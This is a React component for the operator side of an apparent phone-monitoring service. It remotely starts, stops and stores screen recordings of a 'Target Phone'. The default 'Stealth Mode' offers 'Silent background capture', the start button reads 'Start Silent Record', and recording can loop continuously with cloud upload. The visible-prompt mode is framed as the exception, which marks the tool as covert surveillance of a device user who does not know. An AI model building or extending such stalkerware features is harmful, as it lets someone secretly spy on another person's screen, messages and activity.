"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
    Video, Square, Play, Clock, Download, Trash2,
    AlertTriangle, AlertCircle, X,
    Zap, Shield, Repeat2, Monitor,
    Wifi, Battery, Smartphone, Sparkles,
    Film, RefreshCw
} from 'lucide-react';

interface ScreenRecordViewProps {
    socket: any;
    userUuid: string;
    selectedDeviceId: string | null;
    isOnline: boolean;
    deviceName?: string;
    onTriggerOffline?: (deviceName?: string) => void;
}

interface SavedRecording {
    id: string;
    url: string;
    timestamp: number;
    elapsedMs: number;
    totalMs: number;
    reason: string;
    mode?: string;
    name?: string;
}

const DURATIONS = [
    { label: '2m',  value: 120 },
    { label: '5m',  value: 300 },
    { label: '10m', value: 600 },
];

const STORAGE_KEY = (deviceId: string) => `asml_recs_${deviceId}`;
const MODE_STORAGE_KEY = 'asml_screen_rec_mode';
const DURATION_STORAGE_KEY = 'asml_screen_rec_duration';
const PENDING_STORAGE_KEY = (deviceId: string) => `asml_rec_pending_${deviceId}`;

function fmt(ms: number) {
    const s = Math.floor(ms / 1000);
    return `${Math.floor(s / 60)}:${String(s % 60).padStart(2, '0')}`;
}

function timeAgo(ts: number) {
    const d = Math.floor((Date.now() - ts) / 1000);
    if (d < 60)   return 'Just now';
    if (d < 3600) return `${Math.floor(d / 60)}m ago`;
    if (d < 86400) return `${Math.floor(d / 3600)}h ago`;
    return new Date(ts).toLocaleDateString();
}

export default function ScreenRecordView({
    socket, userUuid, selectedDeviceId, isOnline, deviceName, onTriggerOffline
}: ScreenRecordViewProps) {

    const [hasToken,     setHasToken]     = useState<boolean | null>(null);
    const [isRecording,  setIsRecording]  = useState(false);
    const [pendingRec,   setPendingRec]   = useState(false);
    
    // Persist mode & duration across page refreshes
    const [recMode, setRecMode] = useState<'stealth' | 'simple'>('stealth');
    const [recDuration, setRecDuration] = useState<number>(300);

    const [customMin,    setCustomMin]    = useState('');
    const [showCustom,   setShowCustom]   = useState(false);
    const [isUnlimited,  setIsUnlimited]  = useState(false);
    const [recElapsedMs, setRecElapsedMs] = useState(0);
    const [recTotalMs,   setRecTotalMs]   = useState(0);
    const [savedRecs,    setSavedRecs]    = useState<SavedRecording[]>([]);
    const [isLoadingRecs, setIsLoadingRecs] = useState(false);
    const [toast,        setToast]        = useState<{ type: 'ok'|'warn'|'err'; text: string } | null>(null);
    const [playingRec,   setPlayingRec]   = useState<SavedRecording | null>(null);
    const [showSimpleWarn, setShowSimpleWarn] = useState(false);
    const [isSaving,       setIsSaving]       = useState(false);

    const isRecordingRef = useRef(false);
    isRecordingRef.current = isRecording;
    const recordingModeRef = useRef<'stealth' | 'simple'>('stealth');
    recordingModeRef.current = recMode;

    // ── Toast helper ──────────────────────────────────────────────────────────
    const showToast = useCallback((type: 'ok'|'warn'|'err', text: string, ms = 4000) => {
        setToast({ type, text });
        setTimeout(() => setToast(null), ms);
    }, []);

    // ── Load cached mode & duration on mount ──────────────────────────────────
    useEffect(() => {
        if (typeof window === 'undefined') return;
        try {
            const savedMode = localStorage.getItem(MODE_STORAGE_KEY);
            if (savedMode === 'stealth' || savedMode === 'simple') {
                setRecMode(savedMode);
            }
            const savedDur = localStorage.getItem(DURATION_STORAGE_KEY);
            if (savedDur) {
                const parsed = parseInt(savedDur, 10);
                if (!isNaN(parsed) && parsed > 0) {
                    setRecDuration(parsed);
                }
            }
        } catch {}
    }, []);

    // ── Fetch persistent cloud recordings + sync local cache ──────────────────
    const fetchCloudRecordings = useCallback(async () => {
        if (!userUuid || !selectedDeviceId) return;
        setIsLoadingRecs(true);
        try {
            const res = await fetch(`/api/screen-recordings?uuid=${encodeURIComponent(userUuid)}&deviceId=${encodeURIComponent(selectedDeviceId)}`);
            if (res.ok) {
                const data = await res.json();
                if (Array.isArray(data.items)) {
                    setSavedRecs(prev => {
                        const cloudMap = new Map<string, SavedRecording>();
                        data.items.forEach((item: any) => {
                            cloudMap.set(item.id || item.url, {
                                id: item.id || `cloud_${Date.now()}`,
                                url: item.url,
                                timestamp: item.timestamp || (item.created_at ? new Date(item.created_at).getTime() : Date.now()),
                                elapsedMs: item.elapsedMs || 0,
                                totalMs: item.totalMs || 0,
                                reason: item.reason || 'Completed',
                                mode: item.mode || 'stealth',
                                name: item.name
                            });
                        });
                        // Merge local items that might still be syncing
                        prev.forEach(p => {
                            if (!cloudMap.has(p.id) && !cloudMap.has(p.url)) {
                                cloudMap.set(p.id, p);
                            }
                        });
                        const merged = Array.from(cloudMap.values()).sort((a, b) => b.timestamp - a.timestamp);
                        try { localStorage.setItem(STORAGE_KEY(selectedDeviceId), JSON.stringify(merged.slice(0, 30))); } catch {}
                        return merged;
                    });
                }
            }
        } catch (e) {
            console.error("Failed to fetch cloud screen recordings:", e);
        } finally {
            setIsLoadingRecs(false);
        }
    }, [userUuid, selectedDeviceId]);

    // ── Load recordings for active device ─────────────────────────────────────
    useEffect(() => {
        if (!selectedDeviceId) return;
        try {
            const raw = localStorage.getItem(STORAGE_KEY(selectedDeviceId));
            if (raw) setSavedRecs(JSON.parse(raw));

            const pendingRaw = localStorage.getItem(PENDING_STORAGE_KEY(selectedDeviceId));
            if (pendingRaw) {
                const p = JSON.parse(pendingRaw);
                if (Date.now() - (p.timestamp || 0) < 3 * 60 * 1000) {
                    setPendingRec(true);
                    setRecTotalMs((p.duration || 300) * 1000);
                } else {
                    localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId));
                }
            }
        } catch {}

        fetchCloudRecordings();
    }, [selectedDeviceId, fetchCloudRecordings]);

    const persist = useCallback((recs: SavedRecording[], devId: string) => {
        try { localStorage.setItem(STORAGE_KEY(devId), JSON.stringify(recs.slice(0, 30))); } catch {}
    }, []);

    const addRec = useCallback((rec: SavedRecording) => {
        setSavedRecs(prev => {
            const next = [rec, ...prev.filter(r => r.id !== rec.id && r.url !== rec.url).slice(0, 29)];
            if (selectedDeviceId) persist(next, selectedDeviceId);
            return next;
        });
    }, [selectedDeviceId, persist]);

    const deleteRec = useCallback((id: string) => {
        setSavedRecs(prev => {
            const next = prev.filter(r => r.id !== id);
            if (selectedDeviceId) persist(next, selectedDeviceId);
            return next;
        });
    }, [selectedDeviceId, persist]);

    // ── Mode selection ────────────────────────────────────────────────────────
    const handleSelectMode = (val: 'stealth' | 'simple') => {
        setRecMode(val);
        recordingModeRef.current = val;
        try { localStorage.setItem(MODE_STORAGE_KEY, val); } catch {}
    };

    const handleSelectDuration = (val: number) => {
        setRecDuration(val);
        setShowCustom(false);
        setIsUnlimited(false);
        setCustomMin('');
        try { localStorage.setItem(DURATION_STORAGE_KEY, String(val)); } catch {}
    };

    // ── Socket Event Listeners ────────────────────────────────────────────────
    useEffect(() => {
        if (!socket) return;

        const onStatus = (data: any) => {
            if (!data) return;
            switch (data.status) {
                case 'authorized':
                    setHasToken(true);
                    break;
                case 'recording_started':
                    setIsRecording(true);
                    setPendingRec(false);
                    setIsSaving(false);
                    break;
                case 'token_needed':
                    setHasToken(false);
                    break;
                case 'stream_stopped':
                case 'no_token':
                    setHasToken(false);
                    setIsRecording(false);
                    setPendingRec(false);
                    setIsSaving(false);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    break;
                case 'denied':
                    setIsRecording(false);
                    setPendingRec(false);
                    setHasToken(false);
                    setIsSaving(false);
                    if (selectedDeviceId) {
                        try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
                    }
                    showToast('err', data.error || 'Permission denied on device');
                    break;
            }
        };

        const onProgress = (data: any) => {
            if (!data) return;
            setIsRecording(true);
            setPendingRec(false);
            setRecElapsedMs(data.elapsedMs || 0);
            setRecTotalMs(data.totalMs || 0);
        };

        const onComplete = (data: any) => {
            if (!data) return;
            setIsSaving(false);
            setIsRecording(false);
            setPendingRec(false);
            setRecElapsedMs(0);
            setRecTotalMs(0);
            if (selectedDeviceId) {
                try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
            }
            if (data.url) {
                addRec({
                    id: `rec_${Date.now()}`,
                    url: data.url,
                    timestamp: data.timestamp || Date.now(),
                    elapsedMs: data.elapsedMs || 0,
                    totalMs:   data.totalMs   || 0,
                    reason:    data.reason    || 'Completed',
                    mode:      data.mode || recordingModeRef.current || recMode || 'stealth'
                });
                showToast('ok', `Saved recording — ${fmt(data.elapsedMs || 0)}`);
            }
        };

        socket.on('screen_status',       onStatus);
        socket.on('screen_rec_progress', onProgress);
        socket.on('screen_rec_complete', onComplete);

        return () => {
            if (isRecordingRef.current) {
                socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
            }
            socket.off('screen_status',       onStatus);
            socket.off('screen_rec_progress', onProgress);
            socket.off('screen_rec_complete', onComplete);
        };
    }, [socket, selectedDeviceId, userUuid, showToast, addRec, recMode]);

    // ── Actions ───────────────────────────────────────────────────────────────
    const fireStart = useCallback(() => {
        if (!selectedDeviceId || !socket) return;
        const duration = isUnlimited ? 86400 : recDuration;
        setPendingRec(true);
        setRecElapsedMs(0);
        setRecTotalMs(duration * 1000);

        try {
            localStorage.setItem(PENDING_STORAGE_KEY(selectedDeviceId), JSON.stringify({
                mode: recMode,
                timestamp: Date.now(),
                duration
            }));
        } catch {}

        recordingModeRef.current = recMode;
        socket.emit('screen_record_start', {
            uuid: userUuid,
            targetDeviceId: selectedDeviceId,
            duration,
            mode: recMode
        });

        if (recMode === 'stealth') {
            showToast('ok', 'Request queued — Starting silently');
        } else {
            showToast('warn', 'Permission prompt sent to device...');
        }
    }, [selectedDeviceId, socket, userUuid, recMode, recDuration, isUnlimited, showToast]);

    const handleStart = () => {
        if (!selectedDeviceId) return;
        if (!isOnline) {
            onTriggerOffline?.(deviceName);
            return;
        }
        if (!socket || isRecording || pendingRec) return;
        if (recMode === 'simple') { setShowSimpleWarn(true); return; }
        fireStart();
    };

    const handleStop = () => {
        if (!selectedDeviceId || !socket) return;
        socket.emit('screen_record_stop', { uuid: userUuid, targetDeviceId: selectedDeviceId });
        if (isRecording) {
            setIsSaving(true);
        }
        setIsRecording(false);
        setPendingRec(false);
        if (selectedDeviceId) {
            try { localStorage.removeItem(PENDING_STORAGE_KEY(selectedDeviceId)); } catch {}
        }
    };

    const pct = recTotalMs > 0 ? Math.min((recElapsedMs / recTotalMs) * 100, 100) : 0;

    return (
        <div className="w-full max-w-5xl mx-auto space-y-4 pb-20 px-2 sm:px-4">

            {/* ── Toast notification ── */}
            {toast && (
                <div 
                    className="fixed inset-0 z-[800] bg-black/60 backdrop-blur-sm flex items-center justify-center p-4 animate-in fade-in duration-200"
                    onClick={() => setToast(null)}
                >
                    <div 
                        className={`w-full max-w-sm p-4 rounded-2xl flex items-center gap-3 border shadow-2xl animate-in zoom-in-95 duration-200 ${
                            toast.type === 'err'
                                ? 'bg-[#181214]/95 border-rose-500/40 text-rose-200'
                                : 'bg-[#141519]/95 border-orange-500/40 text-white shadow-[0_10px_35px_rgba(249,115,22,0.25)]'
                        }`}
                        onClick={e => e.stopPropagation()}
                    >
                        <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
                            toast.type === 'err'
                                ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                                : 'bg-orange-500/20 text-orange-400 border border-orange-500/30'
                        }`}>
                            {toast.type === 'err' ? <AlertCircle size={18} /> : <Sparkles size={18} />}
                        </div>
                        <div className="flex-1 min-w-0 pr-1">
                            <p className="font-bold text-white text-xs truncate">
                                {toast.type === 'err' ? 'Error' : 'Notice'}
                            </p>
                            <p className="text-[11px] text-white/70 truncate mt-0.5 font-mono">
                                {toast.text}
                            </p>
                        </div>
                        <button
                            type="button"
                            onClick={() => setToast(null)}
                            className="p-1.5 rounded-lg text-white/40 hover:text-white hover:bg-white/10 transition-colors"
                        >
                            <X size={15} />
                        </button>
                    </div>
                </div>
            )}

            {/* ── Top Bar / Status ── */}
            <div className="clay-card p-3 sm:p-4 flex items-center justify-between gap-3 border border-orange-500/20">
                <div className="flex items-center gap-3 min-w-0">
                    <div className="w-10 h-10 rounded-2xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center text-orange-400 shrink-0">
                        <Monitor className="w-5 h-5 text-orange-400" />
                    </div>
                    <div className="min-w-0">
                        <h2 className="text-sm sm:text-base font-bold text-white tracking-tight flex items-center gap-2 truncate">
                            <span>Screen Mirror & Capture</span>
                            <span className="w-2 h-2 rounded-full bg-orange-400 shadow-[0_0_8px_#f97316] animate-pulse shrink-0" />
                        </h2>
                        <div className="flex items-center gap-2 text-xs text-white/50 truncate mt-0.5">
                            <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${isOnline ? 'bg-orange-400' : 'bg-white/20'}`}/>
                            <span className="truncate">{deviceName || 'Target Phone'}</span>
                        </div>
                    </div>
                </div>

                <div className="shrink-0 flex items-center gap-2">
                    <button
                        type="button"
                        onClick={fetchCloudRecordings}
                        disabled={isLoadingRecs}
                        className="p-2 rounded-xl bg-white/5 border border-white/10 text-white/60 hover:text-white hover:border-orange-500/30 transition-all cursor-pointer"
                        title="Refresh recordings"
                    >
                        <RefreshCw size={14} className={isLoadingRecs ? 'animate-spin text-orange-400' : ''} />
                    </button>
                    {hasToken !== null && (
                        <span className={`text-[10px] font-mono font-semibold px-2.5 py-1 rounded-full border ${
                            hasToken 
                                ? 'bg-orange-500/15 border-orange-500/35 text-orange-400 shadow-[0_0_10px_rgba(249,115,22,0.2)]' 
                                : 'bg-white/5 border-white/10 text-white/40'
                        }`}>
                            {hasToken ? 'Live Token' : 'Standby'}
                        </span>
                    )}
                </div>
            </div>

            {/* ── Responsive Two-Column Layout (Controls Left, Realistic Mobile Mockup Right) ── */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 items-start">
                
                {/* ── Left Column: Config & Action Controls (lg:col-span-7) ── */}
                <div className="lg:col-span-7 space-y-3.5">

                    {/* Mode Selection */}
                    <div className="clay-card p-3.5 space-y-2 border border-white/5">
                        <div className="flex items-center justify-between px-0.5">
                            <p className="text-[10px] font-bold uppercase tracking-widest text-white/40 font-mono">
                                Mode
                            </p>
                            <span className="text-[10px] text-orange-400/80 font-mono">
                                {recMode === 'stealth' ? 'Silent Mode' : 'Standard Mode'}
                            </span>
                        </div>

                        <div className="grid grid-cols-2 gap-2">
                            {([
                                ['stealth', 'Stealth Mode', Shield, 'Silent background capture'], 
                                ['simple', 'Standard Mode', Zap, 'Interactive prompt on screen']
                            ] as const).map(([val, label, Icon, desc]) => (
                                <button key={val}
                                    type="button"
                                    onClick={() => handleSelectMode(val)}
                                    disabled={isRecording || pendingRec}
                                    className={`p-3 rounded-2xl text-left transition-all disabled:opacity-40 border cursor-pointer ${
                                        recMode === val
                                            ? 'bg-orange-500/15 border-orange-500/50 shadow-[0_0_16px_rgba(249,115,22,0.15)] ring-1 ring-orange-500/30'
                                            : 'bg-white/[0.03] border-white/[0.08] hover:border-white/20 hover:bg-white/[0.05]'
                                    }`}
                                >
                                    <div className="flex items-center justify-between mb-1">
                                        <Icon size={16} className={recMode === val ? 'text-orange-400' : 'text-white/30'} />
                                        {recMode === val && (
                                            <span className="text-[9px] font-bold uppercase px-1.5 py-0.5 rounded bg-orange-500/20 text-orange-400 border border-orange-500/30">
                                                Active
                                            </span>
                                        )}
                                    </div>
                                    <p className={`text-xs font-bold ${recMode === val ? 'text-white' : 'text-white/50'}`}>{label}</p>
                                    <p className="text-[10px] text-white/40 mt-0.5 leading-relaxed">{desc}</p>
                                </button>
                            ))}
                        </div>
                    </div>

                    {/* Duration Selection */}
                    <div className="clay-card p-3.5 space-y-2.5 border border-white/5">
                        <p className="text-[10px] font-bold uppercase tracking-widest text-white/40 px-0.5 font-mono">
                            Duration
                        </p>
                        <div className="flex gap-2">
                            {DURATIONS.map(d => (
                                <button key={d.value}
                                    type="button"
                                    onClick={() => handleSelectDuration(d.value)}
                                    disabled={isRecording || pendingRec}
                                    className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 cursor-pointer ${
                                        recDuration === d.value && !showCustom && !isUnlimited
                                            ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.35)]'
                                            : 'bg-white/5 text-white/50 hover:text-white/80 border border-white/5'
                                    }`}
                                >{d.label}</button>
                            ))}
                            <button
                                type="button"
                                onClick={() => { setShowCustom(true); setIsUnlimited(false); setRecDuration(0); }}
                                disabled={isRecording || pendingRec}
                                className={`flex-1 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40 cursor-pointer ${
                                    showCustom 
                                        ? 'bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_0_16px_rgba(249,115,22,0.35)]' 
                                        : 'bg-white/5 text-white/50 hover:text-white/80 border border-white/5'
                                }`}
                            >Custom</button>
                        </div>

                        {showCustom && (
                            <div className="flex items-center gap-2 bg-black/40 rounded-xl px-3 py-2 border border-orange-500/30">
                                <input
                                    type="number" min={1} max={10} value={customMin}
                                    onChange={e => {
                                        setCustomMin(e.target.value);
                                        const n = parseInt(e.target.value, 10);
                                        if (!isNaN(n) && n >= 1 && n <= 10) {
                                            setRecDuration(n * 60);
                                            try { localStorage.setItem(DURATION_STORAGE_KEY, String(n * 60)); } catch {}
                                        }
                                    }}
                                    placeholder="1–10"
                                    className="bg-transparent text-white text-sm font-semibold w-12 outline-none placeholder:text-white/20"
                                />
                                <span className="text-[10px] text-white/30 font-mono">minutes (max 10)</span>
                                {recDuration > 0 && <span className="ml-auto text-xs text-orange-400 font-bold font-mono">{recDuration / 60}m</span>}
                            </div>
                        )}

                        <button
                            type="button"
                            onClick={() => { setIsUnlimited(!isUnlimited); setShowCustom(false); setCustomMin(''); }}
                            disabled={isRecording || pendingRec}
                            className={`w-full py-2 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 transition-all disabled:opacity-40 border cursor-pointer ${
                                isUnlimited
                                    ? 'bg-amber-500/15 border-amber-500/40 text-amber-300'
                                    : 'bg-white/[0.02] border-white/[0.06] text-white/35 hover:text-white/60'
                            }`}
                        >
                            <Repeat2 size={13}/>
                            <span>Continuous Loop</span>
                        </button>
                    </div>

                    {/* Action Card */}
                    <div className="clay-card p-3.5 border border-orange-500/20">
                        {!isRecording && !pendingRec ? (
                            <button
                                type="button"
                                onClick={handleStart}
                                disabled={!selectedDeviceId || (showCustom && recDuration <= 0)}
                                className="w-full py-3.5 rounded-2xl font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 bg-gradient-to-r from-orange-500 to-amber-500 text-white shadow-[0_4px_24px_rgba(249,115,22,0.4)] cursor-pointer hover:scale-[1.01] active:scale-[0.99] disabled:opacity-30 disabled:cursor-not-allowed transition-all"
                            >
                                <Play size={15} className="fill-current"/>
                                <span>{recMode === 'stealth' ? 'Start Silent Record' : 'Start Record'}</span>
                            </button>
                        ) : pendingRec && !isRecording ? (
                            <div className="space-y-2.5">
                                <div className="flex items-center gap-3 py-3 px-4 rounded-2xl bg-amber-500/10 border border-amber-500/30">
                                    <Clock size={16} className="text-amber-400 animate-spin shrink-0"/>
                                    <div className="flex-1 min-w-0">
                                        <span className="text-xs font-bold text-amber-300 block">
                                            {recMode === 'stealth' ? 'Waiting for Screen Activity...' : 'Waiting for User Permission...'}
                                        </span>
                                    </div>
                                </div>
                                <button 
                                    type="button"
                                    onClick={handleStop}
                                    className="w-full py-2 rounded-xl text-xs font-bold text-rose-300 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/25 transition-all cursor-pointer"
                                >
                                    Cancel
                                </button>
                            </div>
                        ) : (
                            <div className="space-y-3">
                                <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-2">
                                        <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-pulse shadow-[0_0_10px_#f43f5e]"/>
                                        <span className="text-xs font-bold text-white tracking-wide">Recording Active</span>
                                    </div>
                                    <span className="text-xs font-mono font-bold text-rose-400">
                                        {fmt(recElapsedMs)}{recTotalMs > 0 && !isUnlimited ? ` / ${fmt(recTotalMs)}` : ''}
                                    </span>
                                </div>

                                {!isUnlimited && recTotalMs > 0 && (
                                    <div className="h-1.5 rounded-full bg-white/10 overflow-hidden">
                                        <div className="h-full rounded-full bg-gradient-to-r from-orange-500 to-amber-400 transition-all duration-1000" style={{ width: `${pct}%` }}/>
                                    </div>
                                )}

                                {isSaving ? (
                                    <div className="w-full py-2.5 rounded-xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center gap-2 text-orange-300 font-bold text-xs animate-pulse">
                                        <RefreshCw className="w-4 h-4 text-orange-400 animate-spin" />
                                        <span>Saving & Uploading Video...</span>
                                    </div>
                                ) : (
                                    <button 
                                        type="button"
                                        onClick={handleStop}
                                        className="w-full py-2.5 rounded-xl text-xs font-bold flex items-center justify-center gap-2 bg-rose-500/20 border border-rose-500/40 text-rose-300 hover:bg-rose-500/30 transition-all cursor-pointer shadow-lg"
                                    >
                                        <Square size={13} className="fill-current"/> 
                                        <span>Stop & Save Recording</span>
                                    </button>
                                )}
                            </div>
                        )}
                    </div>

                    {/* Recordings List */}
                    <div className="clay-card overflow-hidden border border-white/5">
                        <div className="px-4 py-3 flex items-center justify-between border-b border-white/[0.06] bg-white/[0.01]">
                            <span className="text-[11px] font-bold text-white/40 uppercase tracking-wider font-mono">
                                Recordings ({savedRecs.length})
                            </span>
                            {savedRecs.length > 0 && (
                                <button 
                                    type="button"
                                    onClick={() => { setSavedRecs([]); if (selectedDeviceId) persist([], selectedDeviceId); }}
                                    className="text-[10px] text-white/30 hover:text-rose-400 transition-colors font-mono cursor-pointer"
                                >
                                    Clear all
                                </button>
                            )}
                        </div>

                        {savedRecs.length > 0 ? (
                            <div className="divide-y divide-white/[0.04] max-h-72 overflow-y-auto">
                                {savedRecs.map(rec => (
                                    <div key={rec.id} className="flex items-center gap-3 px-4 py-2.5 hover:bg-white/[0.03] transition-colors group">
                                        <button
                                            type="button"
                                            onClick={() => setPlayingRec(rec)}
                                            className="w-8 h-8 rounded-xl bg-orange-500/15 border border-orange-500/30 flex items-center justify-center text-orange-400 hover:bg-orange-500 hover:text-white transition-all shrink-0 cursor-pointer"
                                            title="View in frame"
                                        >
                                            <Play size={12} className="fill-current ml-0.5"/>
                                        </button>

                                        <div className="flex-1 min-w-0">
                                            <div className="flex items-center gap-2">
                                                <span className="text-xs font-bold text-white/90 font-mono">
                                                    {rec.elapsedMs > 0 ? fmt(rec.elapsedMs) : 'Video'}
                                                </span>
                                                <span className="text-[9px] px-1.5 py-0.5 rounded font-semibold uppercase font-mono bg-orange-500/20 text-orange-400 border border-orange-500/30">
                                                    {rec.mode === 'simple' ? 'Standard' : 'Silent'}
                                                </span>
                                            </div>
                                            <p className="text-[10px] text-white/35 mt-0.5 font-mono truncate">
                                                {timeAgo(rec.timestamp)}
                                            </p>
                                        </div>

                                        <div className="flex items-center gap-1 opacity-70 group-hover:opacity-100 transition-opacity">
                                            <a href={rec.url} download={`screen_${rec.id}.mp4`}
                                                className="p-1.5 rounded-lg text-white/40 hover:text-white hover:bg-white/10 transition-all cursor-pointer"
                                                title="Download"
                                            ><Download size={13}/></a>
                                            <button 
                                                type="button"
                                                onClick={() => deleteRec(rec.id)}
                                                className="p-1.5 rounded-lg text-white/40 hover:text-rose-400 hover:bg-rose-500/10 transition-all cursor-pointer"
                                                title="Delete"
                                            ><Trash2 size={13}/></button>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        ) : (
                            <div className="py-8 flex flex-col items-center gap-1.5 text-center">
                                <Film size={18} className="text-white/20"/>
                                <p className="text-xs font-semibold text-white/40">No recordings saved</p>
                            </div>
                        )}
                    </div>
                </div>

                {/* ── Right Column: Smartphone Visual Frame Mockup (lg:col-span-5) ── */}
                <div className="lg:col-span-5 flex flex-col items-center justify-center">
                    <div className="relative w-full max-w-[320px] rounded-[42px] bg-[#141519] p-3.5 shadow-[0_20px_60px_rgba(0,0,0,0.9),0_0_0_3px_#272932] border border-white/10">
                        {/* Physical button accents */}
                        <div className="absolute -left-[4px] top-20 w-[3px] h-7 bg-[#373a44] rounded-l" />
                        <div className="absolute -left-[4px] top-30 w-[3px] h-7 bg-[#373a44] rounded-l" />
                        <div className="absolute -right-[4px] top-24 w-[3px] h-10 bg-[#373a44] rounded-r" />

                        {/* Inner Screen Canvas */}
                        <div className="relative rounded-[30px] overflow-hidden bg-black aspect-[9/19] flex flex-col justify-between border border-black/80 shadow-inner">
                            {/* Status Bar */}
                            <div className="absolute top-0 inset-x-0 z-20 pt-2 pb-2 px-4 flex items-center justify-between text-[10px] font-semibold text-white/80 select-none bg-gradient-to-b from-black/80 to-transparent pointer-events-none">
                                <span className="font-mono">9:41</span>
                                <div className="w-16 h-3.5 bg-black rounded-full flex items-center justify-center border border-white/5" />
                                <div className="flex items-center gap-1">
                                    <Wifi size={10} />
                                    <Battery size={11} />
                                </div>
                            </div>

                            {/* Main Screen Content */}
                            <div className="relative w-full h-full flex flex-col items-center justify-center bg-[#090a0f]">
                                {playingRec ? (
                                    <div className="relative w-full h-full flex items-center justify-center bg-black">
                                        <video
                                            key={playingRec.url}
                                            src={playingRec.url}
                                            controls
                                            autoPlay
                                            playsInline
                                            className="w-full h-full object-contain"
                                        />
                                        <button
                                            type="button"
                                            onClick={() => setPlayingRec(null)}
                                            className="absolute top-10 right-3 z-30 p-1.5 rounded-full bg-black/60 text-white/80 hover:text-white border border-white/10 cursor-pointer"
                                            title="Close playback"
                                        >
                                            <X size={14} />
                                        </button>
                                    </div>
                                ) : isRecording ? (
                                    <div className="flex flex-col items-center gap-2 p-6 text-center animate-pulse">
                                        <div className="w-12 h-12 rounded-full bg-rose-500/20 border border-rose-500/40 flex items-center justify-center text-rose-400">
                                            <span className="w-3 h-3 rounded-full bg-rose-500 animate-ping" />
                                        </div>
                                        <p className="text-xs font-bold text-white tracking-wide">Recording Target Screen</p>
                                        <p className="text-[11px] font-mono text-rose-400">{fmt(recElapsedMs)}</p>
                                    </div>
                                ) : pendingRec ? (
                                    <div className="flex flex-col items-center gap-2 p-6 text-center">
                                        <Clock size={24} className="text-amber-400 animate-spin" />
                                        <p className="text-xs font-bold text-amber-300">In Queue</p>
                                        <p className="text-[10px] text-white/40">Waiting for screen wake...</p>
                                    </div>
                                ) : savedRecs.length > 0 ? (
                                    <div className="flex flex-col items-center gap-2 p-6 text-center">
                                        <Smartphone size={28} className="text-orange-400/80" />
                                        <p className="text-xs font-bold text-white/80">Select a recording</p>
                                        <button
                                            type="button"
                                            onClick={() => setPlayingRec(savedRecs[0])}
                                            className="mt-2 px-3 py-1.5 rounded-xl bg-orange-500/20 border border-orange-500/40 text-orange-300 text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-orange-500 hover:text-white transition-all"
                                        >
                                            <Play size={12} className="fill-current" />
                                            <span>Play Latest</span>
                                        </button>
                                    </div>
                                ) : (
                                    <div className="flex flex-col items-center gap-2 p-6 text-center text-white/30">
                                        <Smartphone size={28} />
                                        <p className="text-xs font-semibold">Screen Standby</p>
                                    </div>
                                )}
                            </div>

                            {/* Bottom Home Bar */}
                            <div className="absolute bottom-1.5 inset-x-0 z-20 flex justify-center pointer-events-none">
                                <div className="w-24 h-1 bg-white/30 rounded-full" />
                            </div>
                        </div>
                    </div>
                </div>

            </div>

            {/* ── Standard Mode Warning Modal ── */}
            {showSimpleWarn && (
                <div className="fixed inset-0 z-[750] bg-black/80 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
                    <div className="clay-card w-full max-w-sm p-5 border border-amber-500/25 space-y-4 shadow-2xl">
                        <div className="flex items-center gap-2 text-amber-400">
                            <AlertTriangle size={16}/>
                            <span className="font-bold text-sm">Visible Permission Prompt</span>
                        </div>
                        <p className="text-xs text-white/60 leading-relaxed">
                            A <span className="text-white font-semibold">&quot;Start now?&quot;</span> prompt will appear on the device screen.
                        </p>
                        <div className="flex gap-2">
                            <button 
                                type="button"
                                onClick={() => setShowSimpleWarn(false)}
                                className="flex-1 py-2 rounded-xl text-xs font-semibold text-white/50 border border-white/10 hover:border-white/20 transition-all cursor-pointer"
                            >
                                Cancel
                            </button>
                            <button 
                                type="button"
                                onClick={() => { setShowSimpleWarn(false); fireStart(); }}
                                className="flex-1 py-2 rounded-xl text-xs font-bold bg-orange-500 text-white cursor-pointer"
                            >
                                Send Prompt
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
